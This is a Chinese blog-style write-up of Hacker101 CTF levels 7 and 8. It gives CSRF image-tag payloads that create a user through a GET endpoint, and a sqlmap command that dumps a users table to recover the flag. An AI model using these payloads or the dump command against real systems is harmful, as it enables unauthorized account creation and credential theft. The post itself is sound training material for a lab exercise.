---
title: "hacker101 第7关&&第8关"
date: 2019-11-20T10:50:17+08:00
showDate: true
draft: false
tags: ["security","hacker101", "ctf"]
categories: ["security"]
---

### 第7关 && 第8关

第八和第九好像合起来才是一关，第7关是一个demo，没有flag，第8关才有。

（这两关真的卡了我好久，最后还是看了下别人的经验做出来的

先稍微测了一下第7关demo里面的内容

```js

POST    /login              //登录
POST    /newTicket          //添加ticket（存在xss， csrf）
GET     /ticket?id=         //查看ticket信息（存在sql注入）
GET     /newUser?username=password=password2=       //添加user（居然是GET方法，那肯定有古怪）

```

#### flag1

在第8关里，在没有登录的情况下只能访问`POST /newTicket`，就卡在了这里。尝试了payload


```html

<a href="http://34.74.105.127/b414803f39/newUser?username=admin2&password=admin&password2=admin"></a>

```

![8-1](8-1.png)

没有效果，然后又尝试了

```html

<img src="http://34.74.105.127/b414803f39/newUser?username=admin2&password=admin&password2=admin">

```

还是没用，最后看了下别人的payload

![8-2](8-2.png)

```html

<img src="http://localhost/newUser?username=test&password=test&password2=test">

```

看完还是很疑惑，为什么用localhost能触发？在我没有查到正确解释之前我可能要把他当成作者故意这样设置来理解了。

触发这个csrf之后用新创建的账号登录。

![8-3](8-3.png)


登录后flag就在第一个ticket里面（为啥还有个无效flag？肯定又阴谋~）

![8-4](8-4.png)

#### flag2

现在用完了这个csrf，还剩下一个注入点，那就试试爆库吧。

因为之前测那个demo的时候已经爆过库了，所以数据库和表都是知道的。

直接sqlmap一把梭

```bash

sqlmap -u "http://host/10string/ticket?id=1" --cookie=Cookie -D level7 -T users --dump
```

密码就是flag。

![8-5](8-5.png)
